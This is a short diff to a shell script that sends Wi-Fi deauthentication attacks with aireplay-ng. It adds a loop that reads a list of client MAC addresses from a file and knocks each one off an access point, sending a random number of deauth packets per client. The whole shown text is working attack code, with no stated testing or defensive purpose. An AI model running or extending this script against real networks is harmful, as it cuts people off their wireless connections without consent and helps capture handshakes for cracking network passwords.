@@ -18,3 +18,8 @@ fi
 echo "deauth"   
 aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a MAC -c MAC wlanXmon
 
+while IFS='' read -r line || [[ -n "$line" ]]; do
+#       echo "text read from file: $line"
+        aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a MAC -c $line
+done < "$1"
+
